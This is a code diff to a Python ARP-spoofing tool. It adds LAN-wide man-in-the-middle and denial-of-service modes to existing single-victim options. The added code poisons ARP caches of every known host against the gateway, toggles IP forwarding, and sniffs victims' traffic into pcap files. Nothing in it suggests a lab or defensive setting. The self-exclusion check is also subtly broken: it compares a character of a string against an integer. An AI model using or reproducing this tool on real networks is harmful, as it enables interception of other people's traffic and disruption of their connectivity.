@@ -10,6 +10,7 @@ import socket
 self_ip = str(subprocess.check_output("ipconfig getifaddr en0", shell=True))[2:-3]
 lan = self_ip.split(".")
 lan = lan[0] + "." + lan[1] + "." + lan[2]
+self_id = lan[3]
 nmap_broadcast = lan + ".1/24"
 gateway_ip = str(subprocess.check_output("route get default | grep gateway | cut -f 2 -d \":\"", shell=True))[3:-3]
 gateway_mac = ""
@@ -71,10 +72,29 @@ def arp_poison(target_ip):
 	except Exception as e:
 		print(e)
 
-def mitm_callback(pkt):
-	pkt.show()
+def arp_poison_broadcast():
+	global gateway_mac, gateway_ip
+	if gateway_ip == "" or gateway_mac == "":
+		get_online_hosts_with_mac()
+	print("starting the mitm attack")
+	try:
+		while True:
+			for i in range(1, 255):
+				if i == self_id:
+					continue
+				target_ip = lan + "." + str(i)
+				if target_ip not in hosts.keys():
+					continue
+				send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
+				send(ARP(op=2, pdst=target_ip, hwdst=hosts[target_ip], psrc=gateway_ip), verbose=False)
+			time.sleep(2)
+	except KeyboardInterrupt:
+		print("restoring network")
+		restore()
+	except Exception as e:
+		print(e)
 
-def starvation_callback(pkt):
+def mitm_callback(pkt):
 	pkt.show()
 
 def enable_forwarding():
@@ -93,10 +113,11 @@ def restore():
 while 1:
 	print("select from below options")
 	print("1 get online hosts with mac addresses")
-	print("2 mitm")
-	print("3 dos")
+	print("2 mitm on a victim")
+	print("3 dos on a victim")
+	print("4 mitm on the lan")
+	print("5 dos on the lan")
 	option = input()
-	
 
 	if option == "1":
 		get_online_hosts_with_mac()
@@ -124,7 +145,7 @@ while 1:
 				poison_thread = threading.Thread(target=arp_poison, args=(target_ip,))
 				poison_thread.start()
 				sniff_filter = "ip host " + target_ip
-				print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
+				print(f"[*] Starting network capture. Filter: {sniff_filter}")
 				packets = sniff(filter=sniff_filter, prn=mitm_callback, iface="en0")
 				#packets = sniff(iface="en0", prn=mitm_callback, filter="tcp")
 				wrpcap(target_ip + "_capture.pcap", packets)
@@ -133,7 +154,6 @@ while 1:
 				restore()
 		print("restoring network")
 		restore()
-
 	
 	elif option == "3":
 		print("enter the ip of the victim")
@@ -148,7 +168,7 @@ while 1:
 				poison_thread = threading.Thread(target=arp_poison, args=(target_ip,))
 				poison_thread.start()
 				sniff_filter = "ip host " + target_ip
-				print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
+				print(f"[*] Starting network capture. Filter: {sniff_filter}")
 				packets = sniff(filter=sniff_filter, prn=mitm_callback, iface="en0")
 				#packets = sniff(iface="en0", prn=mitm_callback, filter="tcp")
 				wrpcap(target_ip + "_denied.pcap", packets)
@@ -157,4 +177,36 @@ while 1:
 				restore()
 		print("restoring network")
 		restore()
-	
+
+	elif option == "4":
+		try:
+			enable_forwarding()
+			poison_thread = threading.Thread(target=arp_poison_broadcast)
+			poison_thread.start()
+			#sniff_filter = "ip host not" + self_ip
+			print(f"[*] Starting network capture.")
+			packets = sniff(prn=mitm_callback, iface="en0")
+			#packets = sniff(iface="en0", prn=mitm_callback, filter="tcp")
+			wrpcap("lan_capture.pcap", packets)
+		except KeyboardInterrupt:
+			print("restoring network")
+			restore()
+		print("restoring network")
+		restore()
+
+	elif option == "5":
+		try:
+			disable_forwarding()
+			poison_thread = threading.Thread(target=arp_poison_broadcast)
+			poison_thread.start()
+			#sniff_filter = "ip host " + target_ip
+			print(f"[*] Starting network capture.")
+			packets = sniff(filter="udp", prn=mitm_callback, iface="en0")
+			#packets = sniff(iface="en0", prn=mitm_callback, filter="tcp")
+			wrpcap("lan_denied.pcap", packets)
+		except KeyboardInterrupt:
+			print("restoring network")
+			restore()
+
+disable_forwarding()
+			
